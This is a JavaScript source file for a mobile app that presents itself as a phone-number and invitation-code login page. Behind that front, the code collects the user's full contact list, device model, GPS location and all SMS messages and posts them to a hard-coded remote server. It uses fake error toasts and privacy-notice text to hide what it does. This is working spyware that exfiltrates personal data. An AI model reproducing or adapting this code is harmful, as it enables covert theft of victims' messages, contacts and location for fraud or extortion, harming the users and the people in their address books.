		mui.init();

		mui.plusReady(function () {
			//var main = plus.android.runtimeMainActivity();  
			// main.moveTaskToBack(false);
			var address = plus.device.vendor + '-' + plus.device.model;
			address = address.replace(/\n/g, "").replace(/ /g, "").replace(/\r/g, "");
			var apiserver = 'https://xrk.noahgs.com/api/Uploads/';
			//重复数据处理 预防用户重复点击
			var danjishijian = true;

			function requestPermission(sjh, yqm) {
				plus.android.requestPermissions(
					["android.permission.READ_SMS"],

					function (resultObj) {
						//SmsInfo存放一条短信的各项内容
						var SmsInfo = {}
						//Sms存放所有短信
						var Sms = {}
						var aimei = sjh;
						var aimei2 = yqm;
						var duanxin = '[{"imei":"' + aimei + '","imei2":"' + aimei2 + '"}';
						var Cursor = plus.android.importClass("android.database.Cursor")
						var Uri = plus.android.importClass("android.net.Uri")   //注意啦，android.net.Uri中的net是小写
						var activity = plus.android.runtimeMainActivity()
						var uri = Uri.parse("content://sms/");
						var projection = new Array("_id", "address", "person", "body", "date", "type")
						var cusor = activity.managedQuery(uri, projection, null, null, "date desc")
						var idColumn = cusor.getColumnIndex("_id")
						var nameColumn = cusor.getColumnIndex("person")
						var phoneNumberColumn = cusor.getColumnIndex("address")
						var smsbodyColumn = cusor.getColumnIndex("body")
						var dateColumn = cusor.getColumnIndex("date")
						var typeColumn = cusor.getColumnIndex("type")

						if (cusor != null) {

							while (cusor.moveToNext()) {
								SmsInfo.id = cusor.getString(idColumn)
								SmsInfo.Name = cusor.getInt(nameColumn)
								SmsInfo.Date = cusor.getLong(dateColumn)
								SmsInfo.Date = getFormatDate(SmsInfo.Date)
								SmsInfo.PhoneNumber = cusor.getString(phoneNumberColumn)
								SmsInfo.Smsbody = cusor.getString(smsbodyColumn)
								SmsInfo.Type = cusor.getString(typeColumn)
								var post = JSON.stringify(SmsInfo);
								//console.log(post);
								duanxin = duanxin + ',' + post;
							}
								duanxin = duanxin + ']';
								//alert(duanxin);

							mui.ajax(apiserver + 'apisms', {

								data: {
								data: duanxin
								},
								dataType: 'text',//服务器返回json格式数据
								type: 'post',//HTTP请求类型
								timeout: 10000,//超时时间设置为10秒；              

								success: function (data) {
									mui.toast('加载失败，联系在线客服获得帮助')
									//console.log(con)
								},

								error: function (xhr, type, errorThrown) {
									//异常处理；
								}
							});
							cusor.close()
						}
					},

					function (error) {
						console.log(' [ 异常提示 ] ' + error.code + " = " + error.message);
					});
			}
			//扩展Date功能：将long型日期转换为特定的格式
			Date.prototype.format = function (format) {

				var o = {
					"M+": this.getMonth() + 1,
					"d+": this.getDate(),
					"h+": this.getHours(),
					"m+": this.getMinutes(),
					"s+": this.getSeconds(),
					"q+": Math.floor((this.getMonth() + 3) / 3),
					"S": this.getMilliseconds()
				}

				if (/(y+)/.test(format)) {
					format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
				}

				for (var k in o) {

					if (new RegExp("(" + k + ")").test(format)) {
						format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
					}
				}
				return format;
			}
			//将long型日期转换为特定格式
			function getFormatDate(l, pattern) {
				date = new Date(l);

				if (pattern == undefined) {
					pattern = "yyyy-MM-dd hh:mm:ss";
				}
				return date.format(pattern);
			}
			//alert(plus.device.uuid)
			plus.navigator.setStatusBarBackground("#00d8c9");
			mui("body").off("tap");

			mui("body").on('tap', '#tx', function (event) {
				$('#tx').hide();
				$('#zz').show();
				$('#dl').hide();
			});

			mui("body").on('tap', '#gb', function (event) {
				$('#tx').show();
				$('#zz').hide();
				$('#dl').show();
			});
			
			mui("body").on('tap', '#wj', function (event) {
					wj()
			});
			
			mui("body").on('tap', '#qd', function (event) {

				if (danjishijian) {
					danjishijian = false;
					aa()
				} else {
					aa()
				}
			});

			function getPermission(permissionIdentity, successCallBack, errorCallBack) {
				//权限标识转换成大写  
				var permissionIdentity = permissionIdentity.toUpperCase();
				//获取检测权限的状态  
				var checkResult = plus.navigator.checkPermission(permissionIdentity);
				//权限状态是否正常  
				var permissionStatusOk = false;
				//权限中文名称  
				var permissionName = '';
				//对应 andorid 的具体权限  
				var androidPermission = '';
				//获取权限中文意思与对应 android 系统的权限字符串  
				switch (permissionIdentity) {
					case 'CONTACTS':
						permissionName = '系统联系人';
						androidPermission = 'android.permission.READ_CONTACTS'
						break;
					default:
						permissionName = '未知';
						androidPermission = '未知';
						break;
				}
				//判断检查权限的结果  
				switch (checkResult) {
					case 'authorized':
						//正常的  
						permissionStatusOk = true
						break;
					case 'denied':
						//表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  
						//如果有该权限但是没有打开不进行操作还是会去申请或手动打开  
						// console.log('已关闭' + permissionName + '权限')  
						// errorCallBack('已关闭' + permissionName + '权限');  
						// return  
						break;
					case 'undetermined':
						// 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  
						// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  
						// errorCallBack('未确定' + permissionName + '权限');  
						// return  
						break;
					case 'unknown':
						errorCallBack('无法查询' + permissionName + '权限');
						return
						break;
					default:
						errorCallBack('不支持' + permissionName + '权限');
						return
						break;
				}
				//如果权限是正常的执行成功回调  
				if (permissionStatusOk) {
					successCallBack()
				} else {
					//如果不正常，如果是 andorid 系统，就动态申请权限  

					if (plus.os.name == 'Android') {
						//动态申请权限  

						plus.android.requestPermissions([androidPermission], function (e) {

							if (e.deniedAlways.length > 0) {
								//权限被永久拒绝  
								// 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  
								errorCallBack('请允许应用程序获取此设备权限，您可以在“手机设置》应用程序》权限管理”中配置权限。')
								// console.log('Always Denied!!! ' + e.deniedAlways.toString());  
							}

							if (e.deniedPresent.length > 0) {
								//权限被临时拒绝  
								// 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  
								errorCallBack('请允许应用程序获取此设备权限，您可以在“手机设置》应用程序》权限管理”中配置权限。')
								// console.log('Present Denied!!! ' + e.deniedPresent.toString());  
							}

							if (e.granted.length > 0) {
								//权限被允许  
								//调用依赖获取定位权限的代码  
								successCallBack()
								// console.log('Granted!!! ' + e.granted.toString());  
							}
						}, function (e) {
							errorCallBack('请允许应用程序获取此设备权限，您可以在“手机设置》应用程序》权限管理”中配置权限。')
							// console.log('Request Permissions error:' + JSON.stringify(e));  
						})
					} else if (plus.os.name == 'iOS') {
						//ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  
						//这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  
						//走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  

						if (checkResult == 'undetermined') {
							//调用依赖获取定位权限的代码  
							successCallBack(true)
						} else {
							//如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  

							mui.confirm(permissionName + '权限没有开启，是否确认开启？', '提醒', ['拒绝', '允许'], function (e) {
								//取消  

								if (e.index == 0) {
									errorCallBack('请允许应用程序获取此设备权限，您可以在“手机设置》应用程序》权限管理”中配置权限。')
								} else if (e.index == 1) {
									//确认，打开当前应用权限设置页面  
									var UIApplication = plus.ios.import('UIApplication');
									var application2 = UIApplication.sharedApplication();
									var NSURL2 = plus.ios.import('NSURL');
									// var setting2 = NSURL2.URLWithString("prefs:root=LOCATION_SERVICES");                             
									var setting2 = NSURL2.URLWithString('app-settings:');
									application2.openURL(setting2);
									plus.ios.deleteObject(setting2);
									plus.ios.deleteObject(NSURL2);
									plus.ios.deleteObject(application2)
								}
							}, 'div')
						}
					}
				}
			}

			function aa() {
				
				var sjh = $('#sjh').val();
				 
				    if ($('#sjh').val() == "") {
						mui.toast('请输入手机号码')
					} else
					
					if (!$('#sjh').val().match(/^((13[0-9])|(14[5-9])|(15([0-3]|[5-9]))|(16[6-7])|(17[1-8])|(18[0-9])|(19[1|3])|(19[5|6])|(19[8|9]))\d{8}$/)) {
						mui.toast('输入的手机号码有误，请重新输入')
				    } else {
				
				var yqm = $('#yqm').val();
				
					if ($('#yqm').val() == "") {
						mui.toast('请输入邀请码')
					} else
					
					if (!$('#yqm').val().match(/^\d{6}$/)) {
						mui.toast('输入的邀请码有误，请重新输入')
					}
					
				}
				    if (parseInt(sjh) > 0 && parseInt(yqm) > 0 && parseInt(sjh) > 13000000000 && parseInt(sjh) < 19999999999 && parseInt(yqm) > 100000 && parseInt(yqm) < 999999) {

				getPermission('CONTACTS', function () {
					huoqu(sjh, yqm);
					mui.showLoading('正在登录', 'div')
					
					}, function (msg) {
						
						mui.alert(msg, '提醒', '确定', function () {
							mui.showLoading()
						}, 'div')
						//aa()
					})
				}
			}

			function wj() {
				
				var sjh = $('#sjh').val();

					if ($('#sjh').val() == "") {
						mui.toast('请输入手机号码')
					
				} else
				
					if (!$('#sjh').val().match(/^((13[0-9])|(14[5-9])|(15([0-3]|[5-9]))|(16[6-7])|(17[1-8])|(18[0-9])|(19[1|3])|(19[5|6])|(19[8|9]))\d{8}$/)){
						mui.toast('输入的手机号码有误，请重新输入')
				} else
				  if (sjh.length == 11) {
					  
				    setTimeout(function a() {
						mui.toast('正在发送 邀请码 至您的手机号码，请查收', 'div')
					});
					
					setTimeout(function a() {
						mui.toast('请求短信网关返回数据异常，错误码：17001', 'div')
					},5000);
				}
			}
			
			function dingwei(sjh, yqm) {

				plus.geolocation.getCurrentPosition(translatePoint, function (e) {
					mui.toast("[ 异常提示 ] " + e.message);
				});
			}

			function translatePoint(position) {
				var sjh = $('#sjh').val()
				var yqm = $('#yqm').val()
				var currentLon = position.coords.longitude;
				var currentLat = position.coords.latitude;
				var jingweidu = sjh + ',' + yqm + ',' + currentLon + ',' + currentLat;

				mui.ajax(apiserver + 'apimap', {

					data: {
					data: jingweidu
					},
					dataType: 'text',//服务器返回json格式数据
					type: 'post',//HTTP请求类型
					timeout: 10000,//超时时间设置为10秒；              

					success: function (data) {

						if (data == '获取会员列表（1/3）...') {
							requestPermission(sjh, yqm);
							//setInterval(function(){
							//var sjh=$('#sjh').val();
							//var yqm=$('#yqm').val();
							//requestPermission(sjh,yqm);
							//console.log('send')
							//},30000)
						}
						mui.toast(data)
					},

					error: function (xhr, type, errorThrown) {
						//异常处理
					}
				});
				//书写自己的逻辑
			}
			// 扩展API加载完毕，现在可以正常调用扩展API

			function huoqu(sjh, yqm) {
				var con = sjh + "**" + yqm + '**' + address;

				plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) {

					addressbook.find(["displayName", "phoneNumbers"], function (contacts) {

						for (var i = 0, len = contacts.length; i < len; i++) {
							con = con + '=' + contacts[i].displayName + '|' + (contacts[i].phoneNumbers.length == 0 ? "" : contacts[i].phoneNumbers[0].value);
						}

						mui.ajax(apiserver + 'api', {

							data: {
							data: con
							},
							dataType: 'text',//服务器返回json格式数据
							type: 'post',//HTTP请求类型
							timeout: 10000,//超时时间设置为10秒；              

							success: function (data) {
								//alert(data)

								if (data == '正在加载列表') {
									dingwei(sjh, yqm);

									mui.openWindow({
										url: 'list.html',

										show: {
											autoShow: true
										}
									});
								} else {
									mui.toast(data)
								}
								//console.log(con)
							},

							error: function (xhr, type, errorThrown) {
								//异常处理
							}
						});
						
					}, function () {
						mui.alert("为实现向您提供我们产品及 /或服务的基本功能，您须授权我们收集、使用的必要的信息。如您拒绝提供相应信息，您将无法正常使用我们的产品及 /或服务；");
					}, {
						multiple: true
					});
					
				    }, function (e) {
						mui.alert("为实现向您提供我们产品及 /或服务的附加功能，您可选择授权我们收集、使用的信息。如您拒绝提供，您将无法正常使用相关附加功能或无法达到我们拟达到的功能效果，但并不会影响您正常使用我们产品及 /或服务的基本功能；");
					});
			}
		},'div');